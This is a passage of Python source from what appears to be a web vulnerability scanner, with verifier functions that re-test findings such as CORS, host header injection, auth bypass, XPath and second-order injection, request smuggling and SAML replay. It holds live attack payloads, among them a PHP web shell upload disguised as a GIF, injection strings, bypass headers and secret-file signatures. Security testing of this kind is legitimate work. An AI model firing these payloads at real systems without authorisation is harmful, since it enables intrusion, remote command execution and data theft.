    req_txt     = _fmt_request('GET', url, headers={'Origin': evil_origin})
    try:
        async with http.get(url, headers={'Origin': evil_origin},
                            allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '')
        reflected = evil_origin in acao
        wildcard  = acao == '*'
        creds     = acac.lower() == 'true'
        if reflected and creds:
            human = (
                f'CORS CRITICAL: {evil_origin!r} reflected in ACAO + ACAC:true. '
                'Attacker can make credentialed cross-origin requests from any origin they control.'
            )
        elif reflected:
            human = f'CORS confirmed: {evil_origin!r} reflected in ACAO. Cross-origin reads of response data are possible.'
        elif wildcard:
            human = 'CORS wildcard (ACAO:*): any origin can read responses (cannot combine with ACAC:true per spec).'
        else:
            return _build_proof(f, 0, 1, req_txt, '', '',
                                f'CORS NOT confirmed. ACAO={acao!r}, ACAC={acac!r}')
        resp_excerpt = f'Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}'
        return _proof_det(f, req_txt, resp_excerpt, acao, human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')


async def _v_host_header(f, http, bl):
    url       = f['endpoint']
    evil_host = 'evil.ds1hunter.com'
    req_txt   = _fmt_request('GET', url, headers={'Host': evil_host, 'X-Forwarded-Host': evil_host})
    bl_loc = ''
    try:
        async with http.get(url, allow_redirects=False) as r:
            bl_loc = r.headers.get('Location', '')
    except Exception:
        pass
    hits = attempts = 3
    hits = 0
    resp_text = ''
    for _ in range(attempts):
        try:
            async with http.get(url, headers={'Host': evil_host, 'X-Forwarded-Host': evil_host},
                                allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
                loc  = r.headers.get('Location', '')
            # Suppress Cloudflare/CDN error pages that echo the host in their own error template
            _body_low = body.lower()
            _cf_fp = (
                'dns resolution error' in _body_low
                or ('error' in _body_low and 'cloudflare' in _body_low and evil_host in _body_low
                    and '<title>' in _body_low and 'cloudflare' in _body_low)
            )
            body_hit = evil_host in body and evil_host not in bl and not _cf_fp
            loc_hit  = evil_host in loc  and evil_host not in bl_loc
            if body_hit or loc_hit:
                hits += 1
                resp_text = _excerpt(body, evil_host) if body_hit else f'Location: {loc}'
        except Exception:
            pass
        await asyncio.sleep(0.3)
    human = (
        f'Host header injection confirmed {hits}/{attempts} times: {evil_host!r} reflected '
        'in response body or Location. Enables password-reset poisoning, cache poisoning, SSRF.'
        if hits > 0 else
        f'Host header injection NOT reproduced for {evil_host!r} in {attempts} attempts.'
    )
    return _build_proof(f, hits, attempts, req_txt, resp_text, evil_host, human)


async def _v_auth_bypass(f, http, bl):
    url = f['endpoint']
    bypass_hdrs = [
        ('X-Original-URL', '/'),
        ('X-Rewrite-URL', '/'),
        ('X-Forwarded-For', '127.0.0.1'),
        ('X-Custom-IP-Authorization', '127.0.0.1'),
        ('X-Remote-IP', '127.0.0.1'),
        ('X-Client-IP', '127.0.0.1'),
    ]
    try:
        async with http.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            bl_status = r.status
    except Exception:
        bl_status = 403
    if bl_status not in (401, 403):
        return _proof_unconfirmed(f, f'Endpoint now returns {bl_status} — baseline changed')
    for hdr, val in bypass_hdrs:
        try:
            async with http.get(url, headers={hdr: val}, allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    body    = await r.text(errors='replace')
                    req_txt = _fmt_request('GET', url, headers={hdr: val})
                    human   = (
                        f'Auth bypass confirmed: header {hdr}: {val} causes HTTP 200 on endpoint '
                        f'that returns HTTP {bl_status} normally. '
                        'Server trusts internal-network headers without verifying request source.'
                    )
                    return _proof_det(f, req_txt, body[:400], f'{hdr}: {val}', human)
        except Exception:
            pass
        await asyncio.sleep(0.2)
    return _build_proof(f, 0, 1, '', '', '',
                        f'Auth bypass NOT reproduced. Endpoint still returns {bl_status} for all bypass headers.')


async def _v_sec_headers(f, http, bl):
    url     = f['endpoint']
    req_txt = _fmt_request('GET', url)
    required = [
        'Content-Security-Policy', 'Strict-Transport-Security',
        'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy',
    ]
    try:
        async with http.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            hdrs_l = {k.lower() for k in r.headers}
        missing = [h for h in required if h.lower() not in hdrs_l]
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')
    if missing:
        human = (
            f'Security headers confirmed missing: {", ".join(missing)}. '
            'Standard defences against XSS, clickjacking, and downgrade attacks are absent.'
        )
        return _proof_det(f, req_txt, f'Missing: {", ".join(missing)}', ', '.join(missing), human)
    return _build_proof(f, 0, 1, req_txt, '', '',
                        'All checked security headers now present — may have been patched.')


async def _v_sensitive_file(f, http, bl):
    url     = f['endpoint']
    req_txt = _fmt_request('GET', url)
    sigs    = [
        'DB_PASSWORD', 'SECRET_KEY', 'DATABASE_URL', 'AWS_SECRET',
        'root:x:0:0', '[boot loader]', '<?php', 'password =',
        'private_key', 'BEGIN RSA', 'BEGIN PRIVATE', 'api_key',
    ]
    try:
        async with http.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            status = r.status
            body   = await r.text(errors='replace')
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')
    if status >= 400:
        return _build_proof(f, 0, 1, req_txt, '', '',
                            f'File no longer accessible — HTTP {status}. Possibly remediated.')
    matched = [s for s in sigs if s.lower() in body.lower()]
    match   = matched[0] if matched else f'HTTP {status}'
    human   = (
        f'Sensitive file confirmed accessible: {url} returns HTTP {status}'
        + (f' with sensitive signature {match!r}.' if matched else ' (no specific secrets found but file is public).')
    )
    return _proof_det(f, req_txt, _excerpt(body, match), match, human)


async def _v_info_disclosure(f, http, bl):
    url     = f['endpoint']
    req_txt = _fmt_request('GET', url)
    try:
        async with http.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            body = await r.text(errors='replace')
        m = _INFO_SIG.search(body)
        if m:
            human = (
                f'Info disclosure confirmed: {m.group(0)!r} at {url}. '
                'Reveals technology version or internal error details.'
            )
            return _proof_det(f, req_txt, _excerpt(body, m.group(0)), m.group(0), human)
        return _build_proof(f, 0, 1, req_txt, body[:300], '',
                            'Info disclosure NOT reproduced — signature no longer present.')
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')


async def _v_csrf(f, http, bl):
    ev          = f.get('evidence', {}) or {}
    form_action = ev.get('action', f['endpoint'])
    req_txt     = _fmt_request('GET', form_action)
    try:
        async with http.get(form_action, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            body = await r.text(errors='replace')
        if not _CSRF_TOKEN_RE.search(body):
            human = (
                f'CSRF confirmed: form at {form_action} has no CSRF token on re-check. '
                'State-changing POST can be forged from any origin.'
            )
            return _proof_det(f, req_txt, body[:500], 'no csrf token', human)
        return _build_proof(f, 0, 1, req_txt, body[:400], '',
                            'CSRF token now present — form may have been patched or token dynamically injected.')
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')


async def _v_verb_tamper(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    verb = ev.get('method', 'PATCH')
    req_txt = _fmt_request(verb, url)
    try:
        async with http.request(verb, url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            status = r.status
            body   = await r.text(errors='replace')
        async with http.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as bg:
            bl_status = bg.status
        if status < 400 and bl_status >= 400:
            human = (
                f'HTTP verb tampering confirmed: {verb} {url} returns HTTP {status} '
                f'while GET returns HTTP {bl_status}. Server does not restrict allowed methods.'
            )
            return _proof_det(f, req_txt, body[:400], verb, human)
        return _build_proof(f, 0, 1, req_txt, body[:300], '',
                            f'Verb tamper NOT confirmed: {verb} returns {status} (GET={bl_status}).')
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')


async def _v_generic(f, http, bl):
    url     = f['endpoint']
    req_txt = _fmt_request('GET', url)
    try:
        async with http.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            status = r.status
            body   = await r.text(errors='replace')
        human = (
            f'Generic re-check: {url} returns HTTP {status}. '
            'No class-specific verifier available — manual confirmation required. '
            f'Original evidence: {f.get("evidence", {})}'
        )
        return {
            'title': f.get('title', ''), 'severity': f.get('severity', ''),
            'endpoint': url, 'status': 'unconfirmed', 'confidence': 0.20,
            'attempts': 1, 'hits': 0, 'request': req_txt,
            'response_excerpt': body[:400], 'match': '',
            'timing_delta': None, 'human_proof': human,
        }
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')


# ── New module verifiers ──────────────────────────────────────────────────────

async def _v_file_upload(f, http, bl):
    """Re-verify a file upload finding by re-uploading and checking server response."""
    import io, uuid as _uuid
    ev       = f.get('evidence', {}) or {}
    url      = f['endpoint']
    filename = ev.get('filename', 'shell.php.jpg')
    c_type   = ev.get('content_type', 'image/jpeg')
    content  = b'GIF89a\n<?php echo shell_exec($_GET["cmd"]); ?>'

    req_txt = _fmt_request('POST', url, headers={'Content-Type': 'multipart/form-data'})
    hits = 0
    resp_text = ''
    uploaded_url = ev.get('uploaded_url', '')

    for field in ('file', 'upload', 'image', 'photo', 'attachment', 'document'):
        try:
            form = aiohttp.FormData()
            form.add_field(field, io.BytesIO(content), filename=filename,
                           content_type=c_type)
            async with http.post(url, data=form, allow_redirects=True,
                                 timeout=aiohttp.ClientTimeout(total=15)) as resp:
                body = await resp.text(errors='replace')
                if resp.status in (200, 201):
                    hits += 1
                    resp_text = body[:400]
                    break
        except Exception:
            continue
        await asyncio.sleep(0.3)

    # If we have the previously uploaded URL, check if it's still accessible
    if uploaded_url:
        try:
            async with http.get(uploaded_url, allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
                if r.status == 200 and (b'shell_exec' in body.encode() or 'GIF89a' in body):
                    hits = 3  # confirmed still accessible
                    resp_text = body[:400]
        except Exception:
            pass

    human = (
        f'File upload vulnerability confirmed: server accepted {filename!r} '
        f'with Content-Type: {c_type!r}. '
        + (f'Previously uploaded file still accessible at {uploaded_url}.' if uploaded_url and hits == 3
           else 'Upload accepted without extension or MIME validation.')
        if hits > 0 else
        f'File upload NOT re-confirmed at {url}. Server may have been patched or field name changed.'
    )
    return _build_proof(f, hits, 3, req_txt, resp_text, filename, human)


async def _v_xpath(f, http, bl):
    """Re-verify XPath injection using error-based and boolean differential."""
    ev    = f.get('evidence', {}) or {}
    url   = f['endpoint']
    param = ev.get('parameter', '')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in XPath evidence')

    parsed = urlparse(url)
    qs     = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')

    _XPATH_ERR = re.compile(
        r'XPathException|XPath.*error|javax\.xml\.xpath|SimpleXMLElement|DOMXPath|'
        r'org\.apache\.xpath|System\.Xml\.XPath|xpath.*syntax|invalid.*xpath',
        re.I,
    )

    # Error-based attempt
    error_pl = "' or '1'='1"
    hits = 0
    req_txt = _fmt_request('GET', _mutate_url(url, param, error_pl))
    for _ in range(3):
        try:
            async with http.get(_mutate_url(url, param, error_pl),
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
            if _XPATH_ERR.search(body) and not _XPATH_ERR.search(bl):
                hits += 1
        except Exception:
            pass
        await asyncio.sleep(0.3)

    if hits > 0:
        return _build_proof(f, hits, 3, req_txt, '', 'XPathException', (
            f'XPath injection confirmed: error-based payload {error_pl!r} '
            f'triggered XPath error in param {param!r} ({hits}/3 times).'
        ))

    # Boolean differential
    true_pl  = "' or '1'='1"
    false_pl = "' or '1'='2"
    diff_hits = 0
    for _ in range(3):
        try:
            async with http.get(_mutate_url(url, param, true_pl),
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                tb = await r.text(errors='replace')
            async with http.get(_mutate_url(url, param, false_pl),
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                fb = await r.text(errors='replace')
            if abs(len(tb) - len(fb)) > 50:
                diff_hits += 1
        except Exception:
            pass
        await asyncio.sleep(0.3)

    human = (
        f'XPath injection confirmed: boolean differential on param {param!r} '
        f'shows response size difference ({diff_hits}/3 times).'
        if diff_hits > 0 else
        f'XPath injection NOT re-confirmed on param {param!r}.'
    )
    return _build_proof(f, diff_hits, 3, req_txt, '', '', human)


async def _v_second_order(f, http, bl):
    """
    Re-verify second-order injection: re-store canary, then re-read endpoint.
    Uses store/read URLs from the original finding evidence.
    """
    ev         = f.get('evidence', {}) or {}
    store_url  = ev.get('store_endpoint', '')
    read_url   = ev.get('read_endpoint', f['endpoint'])
    payload    = ev.get('stored_payload', "ds1test'--")
    attack_type = f.get('type', '').replace('second_order_', '')

    if not store_url or not read_url:
        return _proof_unconfirmed(f, 'Missing store/read endpoints in evidence')

    # Phase 1: store canary
    import uuid as _uuid
    uid    = _uuid.uuid4().hex[:8]
    canary = payload.replace('ds1test', f'ds1v{uid}')

    stored = False
    for field in ('username', 'name', 'email', 'comment', 'bio', 'description',
                  'title', 'address', 'note', 'input'):
        try:
            async with http.post(store_url, data={field: canary},
                                 allow_redirects=True,
                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status < 400:
                    stored = True
                    break
        except Exception:
            continue

    if not stored:
        return _proof_unconfirmed(f, f'Could not store canary via {store_url}')

    await asyncio.sleep(0.5)  # allow write to commit

    # Phase 2: trigger
    _ERR = {
        'sqli':   re.compile(r'sql.*syntax|mysql.*error|ORA-\d{5}|sqlite.*error', re.I),
        'xss':    re.compile(r'<script>|onerror=|onload=', re.I),
        'ssti':   re.compile(r'\b49\b|FREEMARKER|TemplateSyntaxError', re.I),
        'cmdi':   re.compile(r'uid=\d+\(.+\)|root:x:0:0', re.I),
        'header': re.compile(r'X-Injected:\s*true', re.I),
    }

    hits = 0
    resp_text = ''
    req_txt   = _fmt_request('GET', read_url)
    for _ in range(2):
        try:
            async with http.get(read_url, allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                body    = await r.text(errors='replace')
                headers = str(dict(r.headers))
            check_text = body + headers
            sig = _ERR.get(attack_type)
            if (canary in check_text) or (sig and sig.search(check_text)):
                hits += 1
                resp_text = body[:400]
        except Exception:
            pass
        await asyncio.sleep(0.5)

    human = (
        f'Second-order {attack_type} confirmed: canary stored via {store_url}, '
        f'triggered at {read_url} ({hits}/2 times). '
        'Payload stored harmlessly but executed in a different request context.'
        if hits > 0 else
        f'Second-order injection NOT re-confirmed. '
        f'Canary absent from {read_url} after storage via {store_url}.'
    )
    return _build_proof(f, hits, 2, req_txt, resp_text, canary, human)


async def _v_h2_desync(f, http, bl):
    """
    Re-verify HTTP/2 desync using a raw TCP/TLS socket probe.
    A timing anomaly or backend error signature confirms the desync.
    """
    import asyncio as _aio, ssl as _ssl, time as _time
    ev      = f.get('evidence', {}) or {}
    url     = f['endpoint']
    variant = ev.get('variant', 'H2.CL')

    parsed   = urlparse(url)
    host     = parsed.hostname or 'localhost'
    port     = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_tls  = parsed.scheme == 'https'

    _DESYNC_SIG = re.compile(
        r'400 Bad Request|Invalid request|Malformed request|'
        r'chunked encoding|Transfer-Encoding.*not allowed|'
        r'bad chunk|unexpected end of request',
        re.I,
    )

    request = (
        f'POST / HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        f'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: 0\r\n'
        f'Transfer-Encoding: chunked\r\n'
        f'\r\n'
        f'G'
    ).encode()

    try:
        if use_tls:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            reader, writer = await _aio.wait_for(
                _aio.open_connection(host, port, ssl=ctx), timeout=10
            )
        else:
            reader, writer = await _aio.wait_for(
                _aio.open_connection(host, port), timeout=10
            )
        writer.write(request)
        await writer.drain()
        t0   = _time.monotonic()
        data = await _aio.wait_for(reader.read(4096), timeout=8)
        elapsed = _time.monotonic() - t0
        writer.close()
        response = data.decode(errors='replace')

        confirmed = _DESYNC_SIG.search(response) or elapsed > 5.0
        req_txt   = f'POST / HTTP/1.1 [CL:0 + TE:chunked desync probe to {host}:{port}]'
        human = (
            f'HTTP/2 desync ({variant}) re-confirmed: probe to {host}:{port} '
            f'produced {"error signature" if _DESYNC_SIG.search(response) else f"timing anomaly ({elapsed:.1f}s)"}. '
            'Backend accepts conflicting framing headers.'
            if confirmed else
            f'H2 desync NOT re-confirmed. Response normal, no timing anomaly.'
        )
        return _build_proof(f, 1 if confirmed else 0, 1,
                            req_txt, response[:400], variant, human)

    except _aio.TimeoutError:
        return _build_proof(f, 1, 1,
                            f'Raw probe to {host}:{port}', '[backend timeout]', variant,
                            f'H2 desync ({variant}) likely confirmed: backend timed out on conflicting '
                            'framing headers — classic CL.0 / TE desync indicator.')
    except Exception as exc:
        return _proof_unconfirmed(f, f'Raw probe error: {exc}')


async def _v_saml(f, http, bl):
    """Re-verify SAML vulnerability by replaying the attack payload."""
    import base64 as _b64
    ev      = f.get('evidence', {}) or {}
    url     = f['endpoint']
    payload = ev.get('payload_excerpt', '')
    title   = f.get('title', '').lower()

    if not payload:
        return _proof_unconfirmed(f, 'No SAML payload in evidence — manual replay required')

    # Truncated payload in evidence; rebuild minimal signature-stripped assertion
    _ACCEPT = re.compile(r'dashboard|welcome|logged.in|profile|account|success|token', re.I)
    _REJECT = re.compile(r'invalid.*saml|signature.*fail|not.*valid|authentication.*fail|forbidden', re.I)

    req_txt = _fmt_request('POST', url, headers={'Content-Type': 'application/x-www-form-urlencoded'})

    # Replay the stored payload (base64-encoded)
    try:
        encoded = _b64.b64encode(payload.encode()).decode()
        data    = {'SAMLResponse': encoded, 'RelayState': ''}
        async with http.post(url, data=data, allow_redirects=True,
                             timeout=aiohttp.ClientTimeout(total=15)) as resp:
            body = await resp.text(errors='replace')

        rejected  = _REJECT.search(body)
        accepted  = _ACCEPT.search(body) and not _REJECT.search(bl)
        confirmed = accepted and not rejected

        human = (
            f'SAML attack re-confirmed: replayed {title.split("-")[0].strip()} payload '
            f'to {url} — server returned acceptance signature.'
            if confirmed else
            f'SAML attack NOT re-confirmed at {url}. '
            'Server may have patched signature validation or response pattern changed. '
            'Manual replay with the full payload is recommended.'
        )
        return _build_proof(f, 1 if confirmed else 0, 1,
                            req_txt, body[:400], 'SAMLResponse', human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'SAML replay error: {exc}')


# ── New-gap verifiers ─────────────────────────────────────────────────────────

async def _v_ldap(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify LDAP injection by replaying the confirmed payload."""
    ev      = f.get('evidence', {})
    url     = f.get('endpoint', '')
    param   = ev.get('parameter', 'username')
    payload = ev.get('payload', '*')
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    from urllib.parse import urlencode
    _LDAP_ERR = re.compile(
        r'LDAPException|ldap_search|ldap_bind|LDAP_INVALID_SYNTAX|'
        r'javax\.naming\.directory|Invalid DN syntax|Bad search filter',
        re.I,
    )
    try:
        async with http.post(
            url,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data=urlencode({param: payload, 'password': 'x'}),
            allow_redirects=False,
            ssl=False,
        ) as resp:
            body = await resp.text(errors='replace')
            technique = ev.get('technique', '')
            if _LDAP_ERR.search(body) and not _LDAP_ERR.search(bl):
                human = f'LDAP error string in response to payload {payload!r}'
                req_txt = f'POST {url}\n{param}={payload}'
                return _proof_confirmed(f, human, req_txt, body[:400], param, human)
            if technique == 'auth_bypass' and resp.status == 200 and resp.status != 401:
                human = f'Payload {payload!r} returned HTTP 200 (baseline was auth-required)'
                req_txt = f'POST {url}\n{param}={payload}'
                return _proof_confirmed(f, human, req_txt, body[:400], param, human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'LDAP re-verify error: {exc}')
    return _proof_unconfirmed(f, 'LDAP signal not reproduced on re-verification')


async def _v_padding_oracle(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify padding oracle by replaying the bit-flip probes."""
    ev     = f.get('evidence', {})
    url    = f.get('endpoint', '')
    source = ev.get('source', 'cookie')
    name   = ev.get('parameter', '')
    if not url or not name:
        return _proof_unconfirmed(f, 'Insufficient evidence for replay')
    signals = ev.get('signals', [])
    if 'Explicit padding error' in ' '.join(signals):
        human = f'Padding error exception confirmed in evidence: {signals[0]}'
        return _proof_confirmed(f, human, f'GET {url}', ev.get('snippet','')[:300],
                                name, human)
    return _proof_unconfirmed(f, 'Padding oracle requires manual CBC bit-flip replay')


async def _v_cloud_storage(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify cloud storage misconfiguration by fetching the bucket URL."""
    url   = f.get('endpoint', '')
    vtype = f.get('type', '')
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    try:
        async with http.get(url, ssl=False, allow_redirects=False) as resp:
            body = await resp.text(errors='replace')
            if resp.status == 200 and ('<ListBucketResult' in body or
                                        '<EnumerationResults' in body or
                                        '<Key>' in body):
                human = f'Cloud bucket listing confirmed at {url} (HTTP 200)'
                return _proof_confirmed(f, human, f'GET {url}', body[:400], 'bucket', human)
            if 'credential' in vtype and resp.status == 200:
                human = f'Credential pattern re-confirmed in source at {url}'
                return _proof_confirmed(f, human, f'GET {url}', body[:300], 'credential', human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'Cloud storage re-verify error: {exc}')
    return _proof_unconfirmed(f, 'Bucket not publicly listing on re-check')


async def _v_ssi(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify SSI injection by replaying the safe echo payload."""
    import urllib.parse as _up
    ev      = f.get('evidence', {})
    url     = f.get('endpoint', '')
    param   = ev.get('parameter', 'q')
    payload = ev.get('payload', '<!--#echo var="DATE_LOCAL"-->')
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    _CONFIRM = re.compile(
        r'\d{2}/\d{2}/\d{4}|\d{4}-\d{2}-\d{2}|Monday|Tuesday|Wednesday|'
        r'Thursday|Friday|Saturday|Sunday', re.I,
    )
    try:
        async with http.get(
            f'{url}?{param}={_up.quote(payload)}', ssl=False, allow_redirects=False,
        ) as resp:
            body = await resp.text(errors='replace')
            if _CONFIRM.search(body) and payload not in body:
                human = f'SSI {payload!r} interpreted — date/env output found'
                return _proof_confirmed(f, human, f'GET {url}?{param}=<ssi>', body[:400],
                                        param, human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'SSI re-verify error: {exc}')
    return _proof_unconfirmed(f, 'SSI not reproduced on re-check')


async def _v_format_string(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify format string injection by replaying the %x probe."""
    ev      = f.get('evidence', {})
    url     = f.get('endpoint', '')
    param   = ev.get('parameter', 'q')
    payload = ev.get('payload', '%x%x%x%x')
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    _CONFIRM = re.compile(r'0x[0-9a-fA-F]{4,}|\(null\)|\(nil\)|Segmentation fault', re.I)
    try:
        async with http.post(
            url, data={param: payload, 'password': 'x'},
            ssl=False, allow_redirects=False,
        ) as resp:
            body = await resp.text(errors='replace')
            m = _CONFIRM.search(body)
            if m:
                human = f'Format string {payload!r} leaked memory: {m.group(0)}'
                return _proof_confirmed(f, human, f'POST {url} {param}={payload}',
                                        body[:400], param, human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'FormatString re-verify error: {exc}')
    return _proof_unconfirmed(f, 'Format string not reproduced on re-check')


async def _v_session_check(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Generic verifier for session-management findings (timeout, logout, puzzling)."""
    ev     = f.get('evidence', {})
    url    = f.get('endpoint', '')
    vtype  = f.get('type', '')
    if 'not_invalidated' in vtype:
        status = ev.get('post_logout_status')
        if status == 200:
            human = f'Token still valid after logout (HTTP 200 on protected resource)'
            return _proof_confirmed(f, human, f'GET {url}', ev.get('response_snippet',''), '', human)
    if 'no_timeout' in vtype or 'no_expiry' in vtype or 'long_expiry' in vtype:
        human = f'Cookie/JWT missing or excessive expiry — confirmed via header analysis'
        return _proof_confirmed(f, human, f'GET {url}', str(ev), '', human)
    return _proof_unconfirmed(f, 'Session check requires manual verification')


async def _v_cache_check(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify browser cache weakness by re-fetching the sensitive endpoint."""
    url = f.get('endpoint', '')
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    try:
        async with http.get(url, ssl=False, allow_redirects=False) as resp:
            if resp.status != 200:
                return _proof_unconfirmed(f, f'Endpoint returned {resp.status} on re-check')
            cc = resp.headers.get('Cache-Control','').lower()
            if 'no-store' not in cc and 'no-cache' not in cc:
                human = f'Cache-Control: {cc or "(absent)"} — no-store/no-cache absent'
                body  = await resp.text(errors='replace')
                return _proof_confirmed(f, human, f'GET {url}', body[:200], 'Cache-Control', human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'Cache re-verify error: {exc}')
    return _proof_unconfirmed(f, 'Cache-Control now set correctly on re-check')


async def _v_xssi(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify XSSI by re-fetching the JSON endpoint unauthenticated."""
    url    = f.get('endpoint', '')
    vtype  = f.get('type', '')
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    _SENSITIVE = re.compile(r'"email"\s*:|"token"\s*:|"user_id"\s*:', re.I)
    _JSONP_RE  = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(', re.M)
    try:
        async with http.get(url, headers={'Accept': 'application/json'},
                            ssl=False, allow_redirects=False) as resp:
            body = await resp.text(errors='replace')
            if 'jsonp' in vtype and _JSONP_RE.search(body):
                human = f'JSONP callback wrapping confirmed at {url}'
                return _proof_confirmed(f, human, f'GET {url}', body[:300], 'jsonp', human)
            if _SENSITIVE.search(body) and resp.status == 200:
                human = f'Sensitive JSON returned without auth at {url}'
                return _proof_confirmed(f, human, f'GET {url}', body[:300], 'json', human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'XSSI re-verify error: {exc}')
    return _proof_unconfirmed(f, 'XSSI not reproduced on re-check')


async def _v_weak_crypto(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
    """Re-verify weak crypto finding by re-checking the response header/body."""
    url   = f.get('endpoint', '')
    vtype = f.get('type', '')
    ev    = f.get('evidence', {})
    if not url:
        return _proof_unconfirmed(f, 'No endpoint')
    _WEAK = re.compile(r'RC4|DES(?!-EDE)|3DES|MD5|SHA-?1\b|ECB', re.I)
    _ECB  = re.compile(r'([A-Za-z0-9+/]{22,24}==?)\1')
    try:
        async with http.get(url, ssl=False, allow_redirects=False) as resp:
            body = await resp.text(errors='replace')
            if 'ecb' in vtype:
                m = _ECB.search(body)
                if m:
                    human = f'ECB repeated block still present: {m.group(1)}'
                    return _proof_confirmed(f, human, f'GET {url}', body[:300],
                                            'ciphertext', human)
            else:
                for hname in ('Server','X-Powered-By'):
                    hval = resp.headers.get(hname,'')
                    if _WEAK.search(hval):
                        human = f'Weak crypto header re-confirmed: {hname}: {hval}'
                        return _proof_confirmed(f, human, f'GET {url}', hval, hname, human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'WeakCrypto re-verify error: {exc}')
    return _proof_unconfirmed(f, 'Weak crypto not reproduced on re-check')


# ── Dispatch table ────────────────────────────────────────────────────────────

def _classify(finding: Dict) -> str:
    # Type-field dispatch for modules that set it reliably; must precede title
    # matching so second_order findings (whose titles contain "sql injection",
    # "xss", etc.) are not misclassified as the base vuln types.
    tp = finding.get('type', '')
    if tp.startswith('second_order'):                    return 'second_order'
    if tp == 'file_upload':                              return 'file_upload'
    if tp == 'h2_desync':                                return 'h2_desync'
    if tp == 'xpath_injection':                          return 'xpath'
    if tp == 'saml_attack':                              return 'saml'
    if tp == 'ldap_injection':                           return 'ldap'
    if tp == 'padding_oracle':                           return 'padding_oracle'
    if tp in ('aws_s3_public_listing', 'aws_s3_public_writable', 'aws_s3_bucket_exists',
              'gcs_public_listing', 'gcs_bucket_exists', 'azure_blob_public_listing',
              'cloud_url_in_source', 'cloud_credential_in_source'):
        return 'cloud_storage'
    if tp == 'ssi_injection':                            return 'ssi'
    if tp == 'format_string':                            return 'format_string'
    if tp == 'email_header_injection':                   return 'email_inject'
    if tp == 'css_injection':                            return 'css_inject'
    if tp in ('xssi_sensitive_json', 'xssi_array_response', 'jsonp_endpoint'):
        return 'xssi'
    if tp == 'web_messaging_insecure':                   return 'web_messaging'
    if tp == 'js_execution_sink':                        return 'js_exec'
    if tp.startswith('weak_crypto') or tp.startswith('ecb_mode') or \
       tp.startswith('weak_hash'):                       return 'weak_crypto'
    if tp in ('session_not_invalidated', 'logout_csrf_risk'):  return 'session_mgmt'
    if tp in ('session_no_timeout', 'jwt_no_expiry', 'jwt_long_expiry',
              'session_variable_overload'):              return 'session_mgmt'
    if tp == 'sensitive_page_cached':                    return 'browser_cache'
    if tp in ('guessable_security_question',
              'security_question_no_lockout'):           return 'sec_question'
    if tp in ('alt_channel_xmlrpc', 'alt_channel_soap',
              'alt_channel_basic_auth'):                 return 'alt_channel'

    t = finding.get('title', '').lower()
    if 'sql injection' in t and 'time blind' in t:   return 'sqli_time'
    if 'sql injection' in t and 'boolean blind' in t: return 'sqli_bool'
